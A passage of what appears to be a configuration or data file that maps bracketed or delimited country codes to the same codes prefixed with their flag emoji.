        " JM)": " 🇯🇲 JM ",
        " JP)": " 🇯🇵 JP ",
        " JE)": " 🇯🇪 JE ",
        " JO)": " 🇯🇴 JO ",
        " KZ)": " 🇰🇿 KZ ",
        " KE)": " 🇰🇪 KE ",
        " KI)": " 🇰🇮 KI ",
        " KP)": " 🇰🇵 KP ",
        " KR)": " 🇰🇷 KR ",
        " KW)": " 🇰🇼 KW ",
        " KG)": " 🇰🇬 KG ",
        " TO)": " 🇹🇴 TO ",
        " LA)": " 🇱🇦 LA ",
        " LV)": " 🇱🇻 LV ",
        " LB)": " 🇱🇧 LB ",
        " LS)": " 🇱🇸 LS ",
        " LR)": " 🇱🇷 LR ",
        " LY)": " 🇱🇾 LY ",
        " LI)": " 🇱🇮 LI ",
        " TL)": " 🇹🇱 TL ",
        " TG)": " 🇹🇬 TG ",
        " TK)": " 🇹🇰 TK ",
        " MG)": " 🇲🇬 MG ",
        " MW)": " 🇲🇼 MW ",
        " MY)": " 🇲🇾 MY ",
        " MV)": " 🇲🇻 MV ",
        " ML)": " 🇲🇱 ML ",
        " MT)": " 🇲🇹 MT ",
        " MH)": " 🇲🇭 MH ",
        " MQ)": " 🇲🇶 MQ ",
        " MR)": " 🇲🇷 MR ",
        " MU)": " 🇲🇺 MU ",
        " YT)": " 🇾🇹 YT ",
        " MX)": " 🇲🇽 MX ",
        " FM)": " 🇫🇲 FM ",
        " MD)": " 🇲🇩 MD ",
        " MC)": " 🇲🇨 MC ",
        " MN)": " 🇲🇳 MN ",
        " ME)": " 🇲🇪 ME ",
        " MS)": " 🇲🇸 MS ",
        " MA)": " 🇲🇦 MA ",
        " MZ)": " 🇲🇿 MZ ",
        " MM)": " 🇲🇲 MM ",
        " NA)": " 🇳🇦 NA ",
        " NR)": " 🇳🇷 NR ",
        " NP)": " 🇳🇵 NP ",
        " NL)": " 🇳🇱 NL ",
        " NC)": " 🇳🇨 NC ",
        " NZ)": " 🇳🇿 NZ ",
        " NI)": " 🇳🇮 NI ",
        " NE)": " 🇳🇪 NE ",
        " NG)": " 🇳🇬 NG ",
        " NU)": " 🇳🇺 NU ",
        " NF)": " 🇳🇫 NF ",
        " MP)": " 🇲🇵 MP ",
        " NO)": " 🇳🇴 NO ",
        " OM)": " 🇴🇲 OM ",
        " PK)": " 🇵🇰 PK ",
        " PW)": " 🇵🇼 PW ",
        " PS)": " 🇵🇸 PS ",
        " PA)": " 🇵🇦 PA ",
        " PG)": " 🇵🇬 PG ",
        " PY)": " 🇵🇾 PY ",
        " PE)": " 🇵🇪 PE ",
        " PH)": " 🇵🇭 PH ",
        " PN)": " 🇵🇳 PN ",
        " PL)": " 🇵🇱 PL ",
        " PT)": " 🇵🇹 PT ",
        " PR)": " 🇵🇷 PR ",
        " QA)": " 🇶🇦 QA ",
        " RE)": " 🇷🇪 RE ",
        " RO)": " 🇷🇴 RO ",
        " RUS)": " 🇷🇺 RUS ",
        " RW)": " 🇷🇼 RW ",
        " BL)": " 🇧🇱 BL ",
        " SH)": " 🇸🇭 SH ",
        " KN)": " 🇰🇳 KN ",
        " LC)": " 🇱🇨 LC ",
        " MF)": " 🇲🇫 MF ",
        " PM)": " 🇵🇲 PM ",
        " VC)": " 🇻🇨 VC ",
        " WS)": " 🇼🇸 WS ",
        " SM)": " 🇸🇲 SM ",
        " ST)": " 🇸🇹 ST ",
        " SA)": " 🇸🇦 SA ",
        " SN)": " 🇸🇳 SN ",
        " RS)": " 🇷🇸 RS ",
        " SC)": " 🇸🇨 SC ",
        " SL)": " 🇸🇱 SL ",
        " SG)": " 🇸🇬 SG ",
        " SX)": " 🇸🇽 SX ",
        " SK)": " 🇸🇰 SK ",
        " SI)": " 🇸🇮 SI ",
        " SB)": " 🇸🇧 SB ",
        " SO)": " 🇸🇴 SO ",
        " ZA)": " 🇿🇦 ZA ",
        " GS)": " 🇬🇸 GS ",
        " SS)": " 🇸🇸 SS ",
        " ES)": " 🇪🇸 ES ",
        " LK)": " 🇱🇰 LK ",
        " SD)": " 🇸🇩 SD ",
        " SR)": " 🇸🇷 SR ",
        " SJ)": " 🇸🇯 SJ ",
        " SZ)": " 🇸🇿 SZ ",
        " SE)": " 🇸🇪 SE ",
        " CH)": " 🇨🇭 CH ",
        " SY)": " 🇸🇾 SY ",
        " TW)": " 🇹🇼 TW ",
        " TJ)": " 🇹🇯 TJ ",
        " TZ)": " 🇹🇿 TZ ",
        " TH)": " 🇹🇭 TH ",
        " TT)": " 🇹🇹 TT ",
        " TN)": " 🇹🇳 TN ",
        " TR)": " 🇹🇷 TR ",
        " TM)": " 🇹🇲 TM ",
        " TC)": " 🇹🇨 TC ",
        " UG)": " 🇺🇬 UG ",
        " UA)": " 🇺🇦 UA ",
        " AE)": " 🇦🇪 AE ",
        " GB)": " 🇬🇧 GB ",
        " USA)": " 🇺🇸 USA ",
        " UM)": " 🇺🇲 UM ",
        " UY)": " 🇺🇾 UY ",
        " UZ)": " 🇺🇿 UZ ",
        " VU)": " 🇻🇺 VU ",
        " VE)": " 🇻🇪 VE ",
        " VN)": " 🇻🇳 VN ",
        " VI)": " 🇻🇮 VI ",
        " WF)": " 🇼🇫 WF ",
        " EH)": " 🇪🇭 EH ",
        " YE)": " 🇾🇪 YE ",
        " ZM)": " 🇿🇲 ZM ",
        " ZW)": " 🇿🇼 ZW ",
        " ROU)": " 🇷🇴 ROU ",
        " SRB)": " 🇷🇸 SRB ",
        " HRV)": " 🇭🇷 HRV ",
        " BIH)": " 🇧🇦 BIH ",
        " UKA)": " 🇺🇦 UKA ",
        "AU]": "🇦🇺 AU ",
        "KU]": "🇰🇷 KU ",
        "UK]": "🇬🇧 UK]",
        "US]": "🇺🇸 US]",
        "DE]": "🇩🇪 DE]",
        "AFG]": "🇦🇫 AFG]",
        "AX]": "🇦🇽 AX]",
        "ALB]": "🇦🇱 ALB]",
        "AL]": "🇦🇱 AL]",
        "DZ]": "🇩🇿 DZ]",
        "AS]": "🇦🇸 AS]",
        "AD]": "🇦🇩 AD]",
        "AO]": "🇦🇴 AO]",
        "AI]": "🇦🇮 AI]",
        "AQ]": "🇦🇶 AQ]",
        "AG]": "🇦🇬 AG]",
        "AR]": "🇦🇪 AR]",
        "AM]": "🇦🇲 AM]",
        "AW]": "🇦🇼 AW]",
        "AT]": "🇦🇹 AT]",
        "AZ]": "🇦🇿 AZ]",
        "BS]": "🇧🇸 BS]",
        "BH]": "🇧🇭 BH]",
        "BD]": "🇧🇩 BD]",
        "BB]": "🇧🇧 BB]",
        "BY]": "🇧🇾 BY]",
        "BE]": "🇧🇪 BE]",
        "BZ]": "🇧🇿 BZ]",
        "BJ]": "🇧🇯 BJ]",
        "BM]": "🇧🇲 BM]",
        "BT]": "🇧🇹 BT]",
        "BO]": "🇧🇴 BO]",
        "BA]": "🇧🇦 BA]",
        "BW]": "🇧🇼 BW]",
        "BV]": "🇧🇻 BV]",
        "BR]": "🇧🇷 BR]",
        "IO]": "🇮🇴 IO]",
        "BN]": "🇧🇳 BN]",
        "BG]": "🇧🇬 BG]",
        "BF]": "🇧🇫 BF]",
        "BI]": "🇧🇮 BI]",
        "KH]": "🇰🇭 KH]",
        "CM]": "🇨🇲 CM]",
        "CA]": "🇨🇦 CA]",
        "CV]": "🇨🇻 CV]",
        "KY]": "🇰🇾 KY]",
        "CF]": "🇨🇫 CF]",
        "TD]": "🇹🇩 TD]",
        "CL]": "🇨🇱 CL]",
        "CN]": "🇨🇳 CN]",
        "CX]": "🇨🇽 CX]",
        "CC]": "🇨🇨 CC]",
        "CO]": "🇨🇴 CO]",
        "KM]": "🇰🇲 KM]",
        "CG]": "🇨🇬 CG]",
        "CD]": "🇨🇩 CD]",
        "CK]": "🇨🇰 CK]",
        "CR]": "🇨🇷 CR]",
        "CI]": "🇨🇮 CI]",
        "HR]": "🇭🇷 HR]",
        "CU]": "🇨🇺 CU]",
        "CY]": "🇨🇾 CY]",
        "CZ]": "🇨🇿 CZ]",
        "DK]": "🇩🇰 DK]",
        "DJ]": "🇩🇯 DJ]",
        "DM]": "🇩🇲 DM]",
        "DO]": "🇩🇴 DO]",
        "EZ]": "🇪🇨 EZ]",
        "EG]": "🇪🇬 EG]",
        "SV]": "🇸🇻 SV]",
        "GQ]": "🇬🇶 GQ]",
        "ER]": "🇪🇷 ER]",
        "EE]": "🇪🇪 EE]",
        "ET]": "🇪🇹 ET]",
        "FK]": "🇫🇰 FK]",
        "FO]": "🇫🇴 FO]",
        "FJ]": "🇫🇯 FJ]",
        "FI]": "🇫🇮 FI]",
        "FR]": "🇫🇷 FR]",
        "GF]": "🇬🇫 GF]",
        "PF]": "🇵🇫 PF]",
        "TF]": "🇹🇫 TF]",
        "GA]": "🇬🇦 GA]",
        "GM]": "🇬🇲 GM]",
        "GE]": "🇬🇪 GE]",
        "GH]": "🇬🇭 GH]",
        "GI]": "🇬🇮 GI]",
        "GR]": "🇬🇷 GR]",
        "GL]": "🇬🇱 GL]",
        "GD]": "🇬🇵 GP]",
        "GU]": "🇬🇺 GU]",
        "GT]": "🇬🇹 GT]",
        "GG]": "🇬🇬 GG]",
        "GN]": "🇬🇳 GN]",
        "GW]": "🇬🇼 GW]",
        "GY]": "🇬🇾 GY]",
        "HT]": "🇭🇹 HT]",
        "HM]": "🇭🇲 HM]",
        "VA]": "🇻🇦 VA]",
        "HN]": "🇭🇳 HN]",
        "HK]": "🇭🇰 HK]",
        "HU]": "🇭🇺 HU]",
        "IS]": "🇮🇸 IS]",
        "IN]": "🇮🇳 IN]",
        "ID]": "🇮🇩 ID]",
        "IR]": "🇮🇷 IR]",
        "IQ]": "🇮🇶 IQ]",
        "IE]": "🇮🇪 IE]",
        "IM]": "🇮🇲 IM]",
        "IL]": "🇮🇱 IL]",
        "IT]": "🇮🇹 IT]",
        "JM]": "🇯🇲 JM]",
        "JP]": "🇯🇵 JP]",
        "JE]": "🇯🇪 JE]",
        "JO]": "🇯🇴 JO]",
        "KZ]": "🇰🇿 KZ]",
        "KE]": "🇰🇪 KE]",
        "KI]": "🇰🇮 KI]",
        "KP]": "🇰🇵 KP]",
        "KR]": "🇰🇷 KR]",
        "KW]": "🇰🇼 KW]",
        "KG]": "🇰🇬 KG]",
        "TO]": "🇹🇴 TO]",
        "LA]": "🇱🇦 LA]",
        "LV]": "🇱🇻 LV]",
        "LB]": "🇱🇧 LB]",
        "LS]": "🇱🇸 LS]",
        "LR]": "🇱🇷 LR]",
        "LY]": "🇱🇾 LY]",
        "LI]": "🇱🇮 LI]",
        "TL]": "🇹🇱 TL]",
        "TG]": "🇹🇬 TG]",
        "TK]": "🇹🇰 TK]",
        "MG]": "🇲🇬 MG]",
        "MW]": "🇲🇼 MW]",
        "MY]": "🇲🇾 MY]",
        "MV]": "🇲🇻 MV]",
        "ML]": "🇲🇱 ML]",
        "MT]": "🇲🇹 MT]",
        "MH]": "🇲🇭 MH]",
        "MQ]": "🇲🇶 MQ]",
        "MR]": "🇲🇷 MR]",
        "MU]": "🇲🇺 MU]",
        "YT]": "🇾🇹 YT]",
        "MX]": "🇲🇽 MX]",
        "FM]": "🇫🇲 FM]",
        "MD]": "🇲🇩 MD]",
        "MC]": "🇲🇨 MC]",
        "MN]": "🇲🇳 MN]",
        "ME]": "🇲🇪 ME]",
        "MS]": "🇲🇸 MS]",
        "MA]": "🇲🇦 MA]",
        "MZ]": "🇲🇿 MZ]",
        "MM]": "🇲🇲 MM]",
        "NA]": "🇳🇦 NA]",
        "NR]": "🇳🇷 NR]",
        "NP]": "🇳🇵 NP]",
        "NL]": "🇳🇱 NL]",
        "NC]": "🇳🇨 NC]",
        "NZ]": "🇳🇿 NZ]",
        "NI]": "🇳🇮 NI]",
        "NE]": "🇳🇪 NE]",
        "NG]": "🇳🇬 NG]",
        "NU]": "🇳🇺 NU]",
        "NF]": "🇳🇫 NF]",
        "MP]": "🇲🇵 MP]",
        "NO]": "🇳🇴 NO]",
        "OM]": "🇴🇲 OM]",
        "PK]": "🇵🇰 PK]",
        "PW]": "🇵🇼 PW]",
        "PS]": "🇵🇸 PS]",
        "PA]": "🇵🇦 PA]",
        "PG]": "🇵🇬 PG]",
        "PY]": "🇵🇾 PY]",
        "PE]": "🇵🇪 PE]",
        "PH]": "🇵🇭 PH]",
        "PN]": "🇵🇳 PN]",
        "PL]": "🇵🇱 PL]",
        "PT]": "🇵🇹 PT]",
        "PR]": "🇵🇷 PR]",
        "QA]": "🇶🇦 QA]",
        "RE]": "🇷🇪 RE]",
        "RO]": "🇷🇴 RO]",
        "RUS]": "🇷🇺 RUS]",
        "RW]": "🇷🇼 RW]",
        "BL]": "🇧🇱 BL]",
        "SH]": "🇸🇭 SH]",
        "KN]": "🇰🇳 KN]",
        "LC]": "🇱🇨 LC]",
        "MF]": "🇲🇫 MF]",
        "PM]": "🇵🇲 PM]",
        "VC]": "🇻🇨 VC]",
        "WS]": "🇼🇸 WS]",
        "SM]": "🇸🇲 SM]",
        "ST]": "🇸🇹 ST]",
        "SA]": "🇸🇦 SA]",
        "SN]": "🇸🇳 SN]",
        "RS]": "🇷🇸 RS]",
        "SC]": "🇸🇨 SC]",
        "SL]": "🇸🇱 SL]",
        "SG]": "🇸🇬 SG]",
        "SX]": "🇸🇽 SX]",
        "SK]": "🇸🇰 SK]",
        "SI]": "🇸🇮 SI]",
        "SB]": "🇸🇧 SB]",
        "SO]": "🇸🇴 SO]",
        "ZA]": "🇿🇦 ZA]",
        "GS]": "🇬🇸 GS]",
        "SS]": "🇸🇸 SS]",
        "ES]": "🇪🇸 ES]",
        "LK]": "🇱🇰 LK]",
        "SD]": "🇸🇩 SD]",
        "SR]": "🇸🇷 SR]",
        "SJ]": "🇸🇯 SJ]",
        "SZ]": "🇸🇿 SZ]",
        "SE]": "🇸🇪 SE]",
        "CH]": "🇨🇭 CH]",
        "SY]": "🇸🇾 SY]",
        "TW]": "🇹🇼 TW]",
        "TJ]": "🇹🇯 TJ]",
        "TZ]": "🇹🇿 TZ]",
        "TH]": "🇹🇭 TH]",
        "TT]": "🇹🇹 TT]",
        "TN]": "🇹🇳 TN]",
        "TR]": "🇹🇷 TR]",
        "TM]": "🇹🇲 TM]",
        "TC]": "🇹🇨 TC]",
        "UG]": "🇺🇬 UG]",
        "UA]": "🇺🇦 UA]",
        "AE]": "🇦🇪 AE]",
        "GB]": "🇬🇧 GB]",
        "USA]": "🇺🇸 USA]",
        "UM]": "🇺🇲 UM]",
        "UY]": "🇺🇾 UY]",
        "UZ]": "🇺🇿 UZ]",
        "VU]": "🇻🇺 VU]",
        "VE]": "🇻🇪 VE]",
        "VN]": "🇻🇳 VN]",
        "VI]": "🇻🇮 VI]",
        "WF]": "🇼🇫 WF]",
        "EH]": "🇪🇭 EH]",
        "YE]": "🇾🇪 YE]",
        "ZM]": "🇿🇲 ZM]",
        "ZW]": "🇿🇼 ZW]",
        "ROU]": "🇷🇴 ROU]",
        "SRB]": "🇷🇸 SRB]",
        "HRV]": "🇭🇷 HRV]",
        "BIH]": "🇧🇦 BIH]",
        "UKA]": "🇺🇦 UKA]",
        "AU❖": "🇦🇺 AU ",
        "KU❖": "🇰🇷 KU ",
        "UK❖": "🇬🇧 UK ",
        "US❖": "🇺🇸 US ",
        "DE❖": "🇩🇪 DE ",
        "AFG❖": "🇦🇫 AFG ",
        "AX❖": "🇦🇽 AX ",
        "ALB❖": "🇦🇱 ALB ",
        "AL❖": "🇦🇱 AL ",
        "DZ❖": "🇩🇿 DZ ",
        "AS❖": "🇦🇸 AS ",
        "AD❖": "🇦🇩 AD ",
        "AO❖": "🇦🇴 AO ",
        "AI❖": "🇦🇮 AI ",
        "AQ❖": "🇦🇶 AQ ",
        "AG❖": "🇦🇬 AG ",
        "AR❖": "🇦🇪 AR ",
        "AM❖": "🇦🇲 AM ",
        "AW❖": "🇦🇼 AW ",
        "AT❖": "🇦🇹 AT ",
        "AZ❖": "🇦🇿 AZ ",
        "BS❖": "🇧🇸 BS ",
        "BH❖": "🇧🇭 BH ",
        "BD❖": "🇧🇩 BD ",
        "BB❖": "🇧🇧 BB ",
        "BY❖": "🇧🇾 BY ",
        "BE❖": "🇧🇪 BE ",
        "BZ❖": "🇧🇿 BZ ",
        "BJ❖": "🇧🇯 BJ ",
        "BM❖": "🇧🇲 BM ",
        "BT❖": "🇧🇹 BT ",
        "BO❖": "🇧🇴 BO ",
        "BA❖": "🇧🇦 BA ",
        "BW❖": "🇧🇼 BW ",
        "BV❖": "🇧🇻 BV ",
        "BR❖": "🇧🇷 BR ",
        "IO❖": "🇮🇴 IO ",
        "BN❖": "🇧🇳 BN ",
        "BG❖": "🇧🇬 BG ",
        "BF❖": "🇧🇫 BF ",
        "BI❖": "🇧🇮 BI ",
        "KH❖": "🇰🇭 KH ",
        "CM❖": "🇨🇲 CM ",
        "CA❖": "🇨🇦 CA ",
        "CV❖": "🇨🇻 CV ",
        "KY❖": "🇰🇾 KY ",
        "CF❖": "🇨🇫 CF ",
        "TD❖": "🇹🇩 TD ",
        "CL❖": "🇨🇱 CL ",
        "CN❖": "🇨🇳 CN ",
        "CX❖": "🇨🇽 CX ",
        "CC❖": "🇨🇨 CC ",
        "CO❖": "🇨🇴 CO ",
        "KM❖": "🇰🇲 KM ",
        "CG❖": "🇨🇬 CG ",
        "CD❖": "🇨🇩 CD ",
        "CK❖": "🇨🇰 CK ",
        "CR❖": "🇨🇷 CR ",
        "CI❖": "🇨🇮 CI ",
        "HR❖": "🇭🇷 HR ",
        "CU❖": "🇨🇺 CU ",
        "CY❖": "🇨🇾 CY ",
        "CZ❖": "🇨🇿 CZ ",
        "DK❖": "🇩🇰 DK ",
        "DJ❖": "🇩🇯 DJ ",
        "DM❖": "🇩🇲 DM ",
        "DO❖": "🇩🇴 DO ",
        "EZ❖": "🇪🇨 EZ ",
        "EG❖": "🇪🇬 EG ",
        "SV❖": "🇸🇻 SV ",
        "GQ❖": "🇬🇶 GQ ",
        "ER❖": "🇪🇷 ER ",
        "EE❖": "🇪🇪 EE ",
        "ET❖": "🇪🇹 ET ",
        "FK❖": "🇫🇰 FK ",
        "FO❖": "🇫🇴 FO ",
        "FJ❖": "🇫🇯 FJ ",
        "FI❖": "🇫🇮 FI ",
        "FR❖": "🇫🇷 FR ",
        "GF❖": "🇬🇫 GF ",
        "PF❖": "🇵🇫 PF ",
        "TF❖": "🇹🇫 TF ",
        "GA❖": "🇬🇦 GA ",
        "GM❖": "🇬🇲 GM ",
        "GE❖": "🇬🇪 GE ",
        "GH❖": "🇬🇭 GH ",
        "GI❖": "🇬🇮 GI ",
        "GR❖": "🇬🇷 GR ",
        "GL❖": "🇬🇱 GL ",
        "GD❖": "🇬🇵 GP ",
        "GU❖": "🇬🇺 GU ",
        "GT❖": "🇬🇹 GT ",
        "GG❖": "🇬🇬 GG ",
        "GN❖": "🇬🇳 GN ",
        "GW❖": "🇬🇼 GW ",
        "GY❖": "🇬🇾 GY ",
        "HT❖": "🇭🇹 HT ",
        "HM❖": "🇭🇲 HM ",
        "VA❖": "🇻🇦 VA ",
        "HN❖": "🇭🇳 HN ",
        "HK❖": "🇭🇰 HK ",
        "HU❖": "🇭🇺 HU ",
        "IS❖": "🇮🇸 IS ",
        "IN❖": "🇮🇳 IN ",
        "ID❖": "🇮🇩 ID ",
        "IR❖": "🇮🇷 IR ",
        "IQ❖": "🇮🇶 IQ ",
        "IE❖": "🇮🇪 IE ",
        "IM❖": "🇮🇲 IM ",
        "IL❖": "🇮🇱 IL ",
        "IT❖": "🇮🇹 IT ",
        "JM❖": "🇯🇲 JM ",
        "JP❖": "🇯🇵 JP ",
        "JE❖": "🇯🇪 JE ",
        "JO❖": "🇯🇴 JO ",
        "KZ❖": "🇰🇿 KZ ",
        "KE❖": "🇰🇪 KE ",
        "KI❖": "🇰🇮 KI ",
        "KP❖": "🇰🇵 KP ",
        "KR❖": "🇰🇷 KR ",
        "KW❖": "🇰🇼 KW ",
        "KG❖": "🇰🇬 KG ",
        "TO❖": "🇹🇴 TO ",
        "LA❖": "🇱🇦 LA ",
        "LV❖": "🇱🇻 LV ",
        "LB❖": "🇱🇧 LB ",
        "LS❖": "🇱🇸 LS ",
        "LR❖": "🇱🇷 LR ",
        "LY❖": "🇱🇾 LY ",
        "LI❖": "🇱🇮 LI ",
        "TL❖": "🇹🇱 TL ",
        "TG❖": "🇹🇬 TG ",
        "TK❖": "🇹🇰 TK ",
        "MG❖": "🇲🇬 MG ",
        "MW❖": "🇲🇼 MW ",
        "MY❖": "🇲🇾 MY ",
        "MV❖": "🇲🇻 MV ",
        "ML❖": "🇲🇱 ML ",
        "MT❖": "🇲🇹 MT ",
        "MH❖": "🇲🇭 MH ",
        "MQ❖": "🇲🇶 MQ ",
        "MR❖": "🇲🇷 MR ",
        "MU❖": "🇲🇺 MU ",
        "YT❖": "🇾🇹 YT ",
        "MX❖": "🇲🇽 MX ",
        "FM❖": "🇫🇲 FM ",
        "MD❖": "🇲🇩 MD ",
        "MC❖": "🇲🇨 MC ",
        "MN❖": "🇲🇳 MN ",
        "ME❖": "🇲🇪 ME ",
        "MS❖": "🇲🇸 MS ",
        "MA❖": "🇲🇦 MA ",
        "MZ❖": "🇲🇿 MZ ",
        "MM❖": "🇲🇲 MM ",
        "NA❖": "🇳🇦 NA ",
        "NR❖": "🇳🇷 NR ",
        "NP❖": "🇳🇵 NP ",
        "NL❖": "🇳🇱 NL ",
        "NC❖": "🇳🇨 NC ",
        "NZ❖": "🇳🇿 NZ ",
        "NI❖": "🇳🇮 NI ",
        "NE❖": "🇳🇪 NE ",
        "NG❖": "🇳🇬 NG ",
        "NU❖": "🇳🇺 NU ",
        "NF❖": "🇳🇫 NF ",
        "MP❖": "🇲🇵 MP ",
        "NO❖": "🇳🇴 NO ",
        "OM❖": "🇴🇲 OM ",
        "PK❖": "🇵🇰 PK ",
        "PW❖": "🇵🇼 PW ",
        "PS❖": "🇵🇸 PS ",
        "PA❖": "🇵🇦 PA ",
        "PG❖": "🇵🇬 PG ",
        "PY❖": "🇵🇾 PY ",
        "PE❖": "🇵🇪 PE ",
        "PH❖": "🇵🇭 PH ",
        "PN❖": "🇵🇳 PN ",
        "PL❖": "🇵🇱 PL ",
        "PT❖": "🇵🇹 PT ",
        "PR❖": "🇵🇷 PR ",
        "QA❖": "🇶🇦 QA ",
        "RE❖": "🇷🇪 RE ",
        "RO❖": "🇷🇴 RO ",
        "RUS❖": "🇷🇺 RUS ",
        "RW❖": "🇷🇼 RW ",
        "BL❖": "🇧🇱 BL ",
        "SH❖": "🇸🇭 SH ",
        "KN❖": "🇰🇳 KN ",
        "LC❖": "🇱🇨 LC ",
        "MF❖": "🇲🇫 MF ",
        "PM❖": "🇵🇲 PM ",
        "VC❖": "🇻🇨 VC ",
        "WS❖": "🇼🇸 WS ",
        "SM❖": "🇸🇲 SM ",
        "ST❖": "🇸🇹 ST ",
        "SA❖": "🇸🇦 SA ",
        "SN❖": "🇸🇳 SN ",
        "RS❖": "🇷🇸 RS ",
        "SC❖": "🇸🇨 SC ",
        "SL❖": "🇸🇱 SL ",
        "SG❖": "🇸🇬 SG ",
        "SX❖": "🇸🇽 SX ",
        "SK❖": "🇸🇰 SK ",
        "SI❖": "🇸🇮 SI ",
        "SB❖": "🇸🇧 SB ",
        "SO❖": "🇸🇴 SO ",
        "ZA❖": "🇿🇦 ZA ",
        "GS❖": "🇬🇸 GS ",
        "SS❖": "🇸🇸 SS ",
        "ES❖": "🇪🇸 ES ",
        "LK❖": "🇱🇰 LK ",
        "SD❖": "🇸🇩 SD ",
        "SR❖": "🇸🇷 SR ",
        "SJ❖": "🇸🇯 SJ ",
        "SZ❖": "🇸🇿 SZ ",
        "SE❖": "🇸🇪 SE ",
        "CH❖": "🇨🇭 CH ",
        "SY❖": "🇸🇾 SY ",
        "TW❖": "🇹🇼 TW ",
        "TJ❖": "🇹🇯 TJ ",
        "TZ❖": "🇹🇿 TZ ",
        "TH❖": "🇹🇭 TH ",
        "TT❖": "🇹🇹 TT ",
        "TN❖": "🇹🇳 TN ",
        "TR❖": "🇹🇷 TR ",
        "TM❖": "🇹🇲 TM ",
        "TC❖": "🇹🇨 TC ",
        "UG❖": "🇺🇬 UG ",
        "UA❖": "🇺🇦 UA ",
        "AE❖": "🇦🇪 AE ",
        "GB❖": "🇬🇧 GB ",
        "USA❖": "🇺🇸 USA ",
        "UM❖": "🇺🇲 UM ",
        "UY❖": "🇺🇾 UY ",
        "UZ❖": "🇺🇿 UZ ",
        "VU❖": "🇻🇺 VU ",
        "VE❖": "🇻🇪 VE ",
        "VN❖": "🇻🇳 VN ",
        "VI❖": "🇻🇮 VI ",
        "WF❖": "🇼🇫 WF ",
        "EH❖": "🇪🇭 EH ",
        "YE❖": "🇾🇪 YE ",
        "ZM❖": "🇿🇲 ZM ",
        "ZW❖": "🇿🇼 ZW ",
        "ROU❖": "🇷🇴 ROU ",
        "SRB❖": "🇷🇸 SRB ",
        "HRV❖": "🇭🇷 HRV ",
        "BIH❖": "🇧🇦 BIH ",
        "UKA❖": "🇺🇦 UKA ",
        "AU|": "🇦🇺 AU ",
        "KU|": "🇰🇷 KU ",
        "UK|": "🇬🇧 UK|",
        "US|": "🇺🇸 US|",
        "DE|": "🇩🇪 DE|",
        "AFG|": "🇦🇫 AFG|",
        "AX|": "🇦🇽 AX|",
        "ALB|": "🇦🇱 ALB|",
        "AL|": "🇦🇱 AL|",
        "DZ|": "🇩🇿 DZ|",
        "AS|": "🇦🇸 AS|",
        "AD|": "🇦🇩 AD|",
        "AO|": "🇦🇴 AO|",
        "AI|": "🇦🇮 AI|",
        "AQ|": "🇦🇶 AQ|",
        "AG|": "🇦🇬 AG|",
        "AR|": "🇦🇪 AR|",
        "AM|": "🇦🇲 AM|",
        "AW|": "🇦🇼 AW|",
        "AT|": "🇦🇹 AT|",
        "AZ|": "🇦🇿 AZ|",
        "BS|": "🇧🇸 BS|",
        "BH|": "🇧🇭 BH|",
        "BD|": "🇧🇩 BD|",
        "BB|": "🇧🇧 BB|",
        "BY|": "🇧🇾 BY|",
        "BE|": "🇧🇪 BE|",
        "BZ|": "🇧🇿 BZ|",
        "BJ|": "🇧🇯 BJ|",
        "BM|": "🇧🇲 BM|",
        "BT|": "🇧🇹 BT|",
        "BO|": "🇧🇴 BO|",
        "BA|": "🇧🇦 BA|",
        "BW|": "🇧🇼 BW|",
        "BV|": "🇧🇻 BV|",
        "BR|": "🇧🇷 BR|",
        "IO|": "🇮🇴 IO|",
        "BN|": "🇧🇳 BN|",
        "BG|": "🇧🇬 BG|",
        "BF|": "🇧🇫 BF|",
        "BI|": "🇧🇮 BI|",
        "KH|": "🇰🇭 KH|",
        "CM|": "🇨🇲 CM|",
        "CA|": "🇨🇦 CA|",
        "CV|": "🇨🇻 CV|",
        "KY|": "🇰🇾 KY|",
        "CF|": "🇨🇫 CF|",
        "TD|": "🇹🇩 TD|",
        "CL|": "🇨🇱 CL|",
        "CN|": "🇨🇳 CN|",
        "CX|": "🇨🇽 CX|",
        "CC|": "🇨🇨 CC|",
        "CO|": "🇨🇴 CO|",
        "KM|": "🇰🇲 KM|",
        "CG|": "🇨🇬 CG|",
        "CD|": "🇨🇩 CD|",
        "CK|": "🇨🇰 CK|",
        "CR|": "🇨🇷 CR|",
        "CI|": "🇨🇮 CI|",
        "HR|": "🇭🇷 HR|",
        "CU|": "🇨🇺 CU|",
        "CY|": "🇨🇾 CY|",
        "CZ|": "🇨🇿 CZ|",
        "DK|": "🇩🇰 DK|",
        "DJ|": "🇩🇯 DJ|",
        "DM|": "🇩🇲 DM|",
        "DO|": "🇩🇴 DO|",
        "EZ|": "🇪🇨 EZ|",
        "EG|": "🇪🇬 EG|",
        "SV|": "🇸🇻 SV|",
        "GQ|": "🇬🇶 GQ|",
        "ER|": "🇪🇷 ER|",
        "EE|": "🇪🇪 EE|",
        "ET|": "🇪🇹 ET|",
        "FK|": "🇫🇰 FK|",
        "FO|": "🇫🇴 FO|",
        "FJ|": "🇫🇯 FJ|",
        "FI|": "🇫🇮 FI|",
        "FR|": "🇫🇷 FR|",
        "GF|": "🇬🇫 GF|",
        "PF|": "🇵🇫 PF|",
        "TF|": "🇹🇫 TF|",
        "GA|": "🇬🇦 GA|",
        "GM|": "🇬🇲 GM|",
        "GE|": "🇬🇪 GE|",
        "GH|": "🇬🇭 GH|",
        "GI|": "🇬🇮 GI|",
        "GR|": "🇬🇷 GR|",
        "GL|": "🇬🇱 GL|",
        "GD|": "🇬🇵 GP|",
        "GU|": "🇬🇺 GU|",
        "GT|": "🇬🇹 GT|",
        "GG|": "🇬🇬 GG|",
        "GN|": "🇬🇳 GN|",
        "GW|": "🇬🇼 GW|",
        "GY|": "🇬🇾 GY|",
        "HT|": "🇭🇹 HT|",
        "HM|": "🇭🇲 HM|",
        "VA|": "🇻🇦 VA|",
        "HN|": "🇭🇳 HN|",
        "HK|": "🇭🇰 HK|",
        "HU|": "🇭🇺 HU|",
        "IS|": "🇮🇸 IS|",
        "IN|": "🇮🇳 IN|",
        "ID|": "🇮🇩 ID|",
        "IR|": "🇮🇷 IR|",
        "IQ|": "🇮🇶 IQ|",
        "IE|": "🇮🇪 IE|",
        "IM|": "🇮🇲 IM|",
        "IL|": "🇮🇱 IL|",
        "IT|": "🇮🇹 IT|",
        "JM|": "🇯🇲 JM|",
        "JP|": "🇯🇵 JP|",
        "JE|": "🇯🇪 JE|",
        "JO|": "🇯🇴 JO|",
        "KZ|": "🇰🇿 KZ|",
        "KE|": "🇰🇪 KE|",
        "KI|": "🇰🇮 KI|",
        "KP|": "🇰🇵 KP|",
        "KR|": "🇰🇷 KR|",
        "KW|": "🇰🇼 KW|",
        "KG|": "🇰🇬 KG|",
        "TO|": "🇹🇴 TO|",
